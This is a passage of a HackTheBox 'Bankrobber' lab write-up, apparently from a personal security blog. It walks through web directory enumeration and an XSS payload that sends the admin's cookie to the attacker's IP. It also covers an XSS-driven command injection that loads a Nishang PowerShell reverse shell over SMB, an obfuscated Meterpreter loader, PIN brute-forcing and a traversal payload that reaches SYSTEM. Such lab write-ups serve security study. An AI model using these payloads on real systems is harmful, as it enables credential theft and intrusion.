class="number">18</span>:<span class="number">14</span>:<span class="number">22</span>] <span class="number">200</span> -    <span class="number">8</span>KB - /index.PHP                                                         </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">22</span>] <span class="number">200</span> -    <span class="number">8</span>KB - /INDEX.PHP                                                                           </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">22</span>] <span class="number">200</span> -    <span class="number">8</span>KB - /index.php</span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">22</span>] <span class="number">200</span> -    <span class="number">8</span>KB - /index.php/login/</span><br><span class="line">[18:14:24] 301 -  333B  - /js  -&gt;  http://10.10.10.154/js/                                              </span><br><span class="line">[18:14:26] 302 -    0B  - /login.php  -&gt;  index.php                                     </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">32</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /phpmyadmin                                                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">34</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /phpmyadmin/                                  </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">34</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /phpmyadmin/scripts/setup.php</span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">36</span>] <span class="number">200</span> -    <span class="number">0</span>B  - /register.php                                                        </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">37</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /server-info                                                                  </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">37</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /server-status</span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">37</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /server-status/ </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">45</span>] <span class="number">403</span> -    <span class="number">1</span>KB - Trace.axd::$DATA                                                                        </span><br><span class="line">[18:14:45] 301 -  335B  - /user  -&gt;  http://10.10.10.154/user/              </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">45</span>] <span class="number">200</span> -   <span class="number">39</span>B  - /user/         </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">46</span>] <span class="number">403</span> -    <span class="number">1</span>KB - web.config::$DATA                          </span><br><span class="line">                                                                                        </span><br><span class="line">Task Completed                                                                                                                                                                                                                    </span><br><span class="line">root <span class="keyword">in</span> dirsearch on  master via 🐍 v2<span class="number">.7</span><span class="number">.17</span> took <span class="number">1</span>m3s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure>
+<p>things that caught my attention is this web directories</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[18:13:55] 200 -   40B  - /admin/?/login</span><br><span class="line">[18:13:55] 200 -   40B  - /admin/                </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/index.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Create-account-and-Login"><a href="#Create-account-and-Login" class="headerlink" title="Create account and Login"></a>Create account and Login</h3><p>To test’ I created an account and login it too. Next,<br>I visited the <code>/admin/index.php</code> and says <code>You&#39;re not authorized to view this page</code> for me this is really weird, if you have experience in Web development you will notice that there was an misconfigured in this website.</p>
+<p><img src="/img/bank/admin.PNG" alt="HackTheBox-Bankrobber/admin.png" title="Admin/index.php"></p>
+<h3 id="Steal-Admin-creds-via-Cookies"><a href="#Steal-Admin-creds-via-Cookies" class="headerlink" title="Steal Admin creds via Cookies"></a>Steal Admin creds via Cookies</h3><p>Now I need to get the credentials of the admin. I try to look on the page source of the web page to look for hint but I did not see anything.<br>then I try the e-coin transfer in user page and this <code>alert</code> caught my attention.</p>
+<p><img src="/img/bank/transfer.png" alt="HackTheBox-Bankrobber/transfer.png" title="Transfer e-coin"></p>
+<p>It looks like the admin is checking each transfer transaction, so I intercept it with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool)</p>
+<p><img src="/img/bank/bank-burp1.png" alt="HackTheBox-Bankrobber/bank-burp1.png" title="Bank burp1"></p>
+<p>Using this payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener">PayloadAllTheThings</a></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># xss</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">this.src</span>=<span class="string">"http://10.10.15.71/?c="</span>%<span class="attr">2bdocument.cookie</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>my user id here is <code>ID #4</code> and my <code>username</code> and <code>password</code> in on <code>base64</code> code format.<br><code>toId=</code> is the id where I transfer my e-coin. I set first my <code>nc</code> listener on port 80 then I modify the response with my payload and send it.</p>
+<p><img src="/img/bank/bank-burp-send.png" alt="HackTheBox-Bankrobber/bank-burp-send.png" title="Bank burp2"></p>
+<p>after 5-10 minutes of waiting, I’ll get a response in my <code>nc</code> listener and it’s the username and password of the admin in <code>base64</code> code format.<br>Convert it to plaintext and I got now the admin creds.</p>
+<p><img src="/img/bank/bank-admin-creds.png" alt="HackTheBox-Bankrobber/bank-admin-creds.png" title="Bank Admin credentials"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">Hopelessromantic</span><br></pre></td></tr></table></figure>
+
+<h3 id="Login-as-Admin"><a href="#Login-as-Admin" class="headerlink" title="Login as Admin"></a>Login as Admin</h3><p>Now that I have the admin credentials. I will login as admin, and find some interesting capabilities.<br>and there’s a <code>NOTES.TXT</code> inside of the Admin page.</p>
+<p><img src="/img/bank/bank-notes-web.png" alt="HackTheBox-Bankrobber/bank-notes-web.png" title="Bank Admin page"></p>
+<p>Looking at the notes.</p>
+<p><img src="/img/bank/bank-notes1.png" alt="HackTheBox-Bankrobber/bank-notes1.png" title="Bank Notes"></p>
+<p>I don’t know what that means, but there are two things that I’m sure of.<br>    ⇒ <code>default Xampp</code> folder is in the <code>C:\xampp\htdocs\</code> where you can run a local web server.<br>    ⇒ There’s was a vulnerability in the <code>encode comments</code>. For every IP address.</p>
+<p>Next, the two interesting things – <code>Search users</code> and <code>Backdoorchecker</code>.<br>I try to search my <code>ID #</code> in search users (beta) when you say <code>beta</code> it’s not fully functional, there was an existing bugs and errors with that.</p>
+<p><img src="/img/bank/bank-myid.png" alt="HackTheBox-Bankrobber/my-id.png" title="Bank my id#"></p>
+<p><code>Backdoorchecker</code></p>
+<p><img src="/img/bank/bank-backdoorchecker.png" alt="HackTheBox-Bankrobber/bank-backdoorchecker.png" title="Bank Backdoor Checker"></p>
+<pre><code>⇒ Due to recent hacking attemps on the server, Backdoorcheker features is only accessible from the localhost because it returns the following message when I try any commands:</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure>
+<p>There’s a possibility that this features is vulnerable to <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">SQLi</a>.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="XSS-and-SQL-Injection"><a href="#XSS-and-SQL-Injection" class="headerlink" title="XSS and SQL Injection"></a>XSS and SQL Injection</h3><p>I try to intercept the <code>search users</code> function using <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> and try SQL Injection.</p>
+<p><img src="/img/bank/bank-sql-injection.png" alt="HackTheBox-Bankrobber/bank-sql-injection.png" title="Bank Backdoor Checker"></p>
+<p>It returns to send the request from <code>localhost</code> and the first <code>3</code> characters must be “dir” and you can use the characters <code>$(&quot; or &#39;&amp;&#39;&quot;)</code></p>
+<p>To execute code I use the PhantomJS bot (via XSS) to send a post request to <code>backdoorchecker.php</code> with a code execution bypass inside the parameter.<br>I ping my Kali linux machine and set tcpdump. I used:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirasdf || ping 10.10.15.71</span><br></pre></td></tr></table></figure>
+<p><img src="/img/bank/bank-ping.png" alt="HackTheBox-Bankrobber/bank-ping.png" title="Bank Backdoor Checker"></p>
+<p>and my Kali Linux get a response from Bankrobber</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ tcpdump -i tun0</span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes</span><br><span class="line">07:25:28.957530 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421326422 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:29.208067 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421326672 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:29.967531 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421327432 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:30.222861 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421327687 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:31.983082 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421329447 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:32.239634 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421329704 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:34.209667 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421331674 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:35.215733 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421332680 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:36.015323 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421333479 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:37.231355 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421334695 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:44.207219 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421341671 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:26:00.335356 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421357799 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="Get-Reverse-Shell"><a href="#Get-Reverse-Shell" class="headerlink" title="Get Reverse Shell"></a>Get Reverse Shell</h3><p>To exploit this vulnerabilities and get a reverse shell. I used the <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang - Offensive PowerShell for red team, penetration testing and offensive security.</a> I use the script, <code>Invoke-PowerShellTcp.ps1</code> and named it to <code>evil.ps1</code>.<br>I called it using powershell through an <code>Impacket Samba Server</code> and setup an <code>nc</code> listener to my Kali Linux.</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># javascript</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> xh;<span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;xh=<span class="keyword">new</span> XMLHttpRequest()&#125;<span class="keyword">else</span>&#123;xh=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>)&#125;;xh.open(<span class="string">"POST"</span>,<span class="string">"/admin/backdoorchecker.php"</span>);xh.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);xh.send(<span class="string">"cmd=dirasdf || copy \\\\10.10.15.71\\test\\dfuck"</span>);&lt;<span class="regexp">/script&gt;&amp;amount=&lt;script&gt;var xh;if (window.XMLHttpRequest) &#123;xh=new XMLHttpRequest()&#125;else&#123;xh=new ActiveXObject("Microsoft.XMLHTTP")&#125;;xh.open("POST","/</span>admin/backdoorchecker.php<span class="string">");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("</span>cmd=dirasdf || copy \\\\<span class="number">10.10</span><span class="number">.15</span><span class="number">.71</span>\\test\\dfuck<span class="string">");&lt;/script&gt;&amp;comment=&lt;script&gt;var xh;if (window.XMLHttpRequest) &#123;xh=new XMLHttpRequest()&#125;else&#123;xh=new ActiveXObject("</span>Microsoft.XMLHTTP<span class="string">")&#125;;xh.open("</span>POST<span class="string">","</span>/admin/backdoorchecker.php<span class="string">");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("</span>cmd=dirasdf || powershell -exec bypass -f \\\\<span class="number">10.10</span><span class="number">.15</span><span class="number">.71</span>\\test\\evil.ps1<span class="string">");&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/bank/bank-XSS.png" alt="HackTheBox-Bankrobber/bank-XSS.png" title="Bank XSS"></p>
+<p>after 5-10 minutes, my <code>impacket-smbserver</code> got a response and get in into the Bankrobber machine.</p>
+<p><img src="/img/bank/bank-impacket.png" alt="HackTheBox-Bankrobber/bank-impacket.png" title="Bank Impacket"></p>
+<p><img src="/img/bank/bank-initial-shell.png" alt="HackTheBox-Bankrobber/bank-initial-shell.png" title="Bank Initial shell"></p>
+<p>and finally I have now the <code>user.txt</code></p>
+<p><img src="/img/bank/bank-user.png" alt="HackTheBox-Bankrobber/bank-user.png" title="Bank USER"></p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Doing some <a href="https://www.sisainfosec.com/blogs/reconnaissance-the-eagles-eye-of-cyber-security/" target="_blank" rel="noopener">Reconnaissance</a>, I used <a href="https://github.com/carlospolop/winpe" target="_blank" rel="noopener">winPE</a> or <code>Windows privilege escalation with cmd</code> it’s a tool similar to <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>.</p>
+<p>It can help with automating Penetration Tests. It performs a discovery on the environment it runs in and tries finding weaknesses to allow privilege escalation. Saving time and allowing more effort to be put toward getting root.</p>
+<h3 id="Process-and-Active-Connections"><a href="#Process-and-Active-Connections" class="headerlink" title="Process and Active Connections"></a>Process and Active Connections</h3><p>running this takes time. after 10-15 minutes I’ve got now the response.</p>
+<p>System Info of Bankrobber<br><img src="/img/bank/bank-winPE.png" alt="HackTheBox-Bankrobber/bank-winPE.png" title="Bank System Info"></p>
+<p>I see something’s odd running on port 910<br><img src="/img/bank/bank-910.png" alt="HackTheBox-Bankrobber/bank-910.png" title="Bank port 910"></p>
+<p>And a suspicious running on the background process named – <code>bankv2.exe</code><br><img src="/img/bank/bank-bankv2.png" alt="HackTheBox-Bankrobber/bank-bankv2.png" title="Bank bankv2"></p>
+<p>so I tunnel my local port 910 in my Kali Linux system to the port 910 of the Bankrobber. To do so I created an obfuscated meterpreter.</p>
+<h3 id="Customizing-custom-Meterpreter-loader"><a href="#Customizing-custom-Meterpreter-loader" class="headerlink" title="Customizing custom Meterpreter loader"></a>Customizing custom Meterpreter loader</h3><p>see this:<br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a></p>
+<p>run the bash script and check the payload file</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">****************************************************************</span><br><span class="line">    Automatic C <span class="built_in">source</span> code generator - FOR METASPLOIT          </span><br><span class="line">           Based on rsmudge metasploit-loader                   </span><br><span class="line">****************************************************************</span><br><span class="line">Metasploit server IP : 10.10.15.71</span><br><span class="line">Metasploit port number : 9001</span><br><span class="line">Compiling binary ..</span><br><span class="line">In file included from temp.c:4:</span><br><span class="line">/usr/share/mingw-w64/include/winsock2.h:15:2: warning: <span class="comment">#warning Please include winsock2.h before windows.h [-Wcpp]</span></span><br><span class="line"> <span class="comment">#warning Please include winsock2.h before windows.h</span></span><br><span class="line">  ^~~~~~~</span><br><span class="line">-rwxr-xr-x 1 root root 292503 Mar  8 09:08 payload.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/img/bank/bank-payload.png" alt="HackTheBox-Bankrobber/bank-payload.png" title="Bank digit code"></p>
+<p>I uploaded it to the Bankrobber and execute it, then I setup a meterpreter session:</p>
+<p>Metasploit meterpreter</p>
+<p><img src="/img/bank/bank-metasploit.png" alt="HackTheBox-Bankrobber/bank-metasploit.png" title="Bank digit code"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; portfwd add -l 910 -p 910 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :910 &lt;-&gt; 127.0.0.1:910</span><br></pre></td></tr></table></figure>
+
+<p>And connect it to the port using <code>nc</code>, then I tried to input a digit code <code>1234</code></p>
+<p><img src="/img/bank/bank-pincode-wr.png" alt="HackTheBox-Bankrobber/bank-pincodewr.png" title="Bank digit code"></p>
+<h3 id="Brute-force-digit-code"><a href="#Brute-force-digit-code" class="headerlink" title="Brute force digit code"></a>Brute force digit code</h3><p>I decided to bruteforce the digit code using <code>bash</code> command line’ even that I have a feeling that I could get block by doing this.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">❯ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="built_in">echo</span> <span class="variable">$i</span> | nc -vn 127.0.0.1 910; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>After a seconds’ I get now the right digit code – <code>0021</code></p>
+<p><img src="/img/bank/bank-right-pin.png" alt="HackTheBox-Bankrobber/bank-right-pin.png" title="Bank digit code"></p>
+<p>When I log in with the PIN, I can transfer e-coins and I see that the <code>transfer.exe</code> command is executed:</p>
+<p><img src="/img/bank/bank-transfer0021.png" alt="HackTheBox-Bankrobber/bank-transfer0021.png" title="Bank digit code"></p>
+<h3 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h3><p>Now, theres a possible RCE on that process.<br>I exploited the E-coin transfer by running my payload inside the Bankrobber machine’ and create <code>meterpreter</code> sessions.<br>Instead of putting amount of E-Coins in transfer. I executed my payload with this line.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">&amp; ..\\..\\..\\..\\..\\..\Users\\C:\Users\Cortin\payload.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/img/bank/bank-RCE.png" alt="HackTheBox-Bankrobber/bank-RCE.png" title="Bank RCE"></p>
+<p>After executed it i got a response from my <code>meterpreter</code> sessions.</p>
+<p><img src="/img/bank/bank-metasploit-root.png" alt="HackTheBox-Bankrobber/bank-metasploit-root.png" title="Bank root"></p>
+<h3 id="Administrator-Shell"><a href="#Administrator-Shell" class="headerlink" title="Administrator Shell"></a>Administrator Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 584 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.</span><br></pre></td></tr></table></figure>
+
+<p>Finally rooted !<br><img src="/img/bank/bank-rooted!.png" alt="HackTheBox-Bankrobber/bank-rooted!.png" title="Bank rooted"></p>
+<p>Get <code>root.txt</code><br><img src="/img/bank/bank-root.png" alt="HackTheBox-Bankrobber/bank-root.png" title="Bank rooted"></p>
+<p>Referrences:<br><a href="https://www.speedguide.net/port.php?port=910" target="_blank" rel="noopener">https://www.speedguide.net/port.php?port=910</a><br><a href="https://www.adminsub.net/tcp-udp-port-finder/910" target="_blank" rel="noopener">https://www.adminsub.net/tcp-udp-port-finder/910</a><br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a><br><a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" target="_blank" rel="noopener">https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects/">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-on-port-3306"><span class="toc-number">4.1.</span> <span class="toc-text">MySQL on port 3306</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-on-port-445"><span class="toc-number">4.2.</span> <span class="toc-text">SMB on port 445</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brutefore-Web-directories"><span class="toc-number">4.3.</span> <span class="toc-text">Brutefore Web directories</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-account-and-Login"><span class="toc-number">5.1.</span> <span class="toc-text">Create account and Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Steal-Admin-creds-via-Cookies"><span class="toc-number">5.2.</span> <span class="toc-text">Steal Admin creds via Cookies</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-as-Admin"><span class="toc-number">5.3.</span> <span class="toc-text">Login as Admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-and-SQL-Injection"><span class="toc-number">6.1.</span> <span class="toc-text">XSS and SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-Reverse-Shell"><span class="toc-number">6.2.</span> <span class="toc-text">Get Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">7.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Process-and-Active-Connections"><span class="toc-number">7.2.</span> <span class="toc-text">Process and Active Connections</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Customizing-custom-Meterpreter-loader"><span class="toc-number">7.3.</span> <span class="toc-text">Customizing custom Meterpreter loader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-force-digit-code"><span class="toc-number">7.4.</span> <span class="toc-text">Brute force digit code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Code-Execution-RCE"><span class="toc-number">7.5.</span> <span class="toc-text">Remote Code Execution (RCE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Administrator-Shell"><span class="toc-number">7.6.</span> <span class="toc-text">Administrator Shell</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&text=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&is_video=false&description=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Bankrobber&body=Check out this article: https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&name=HackTheBox - Bankrobber&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&t=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    InfoSec &#64; medz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
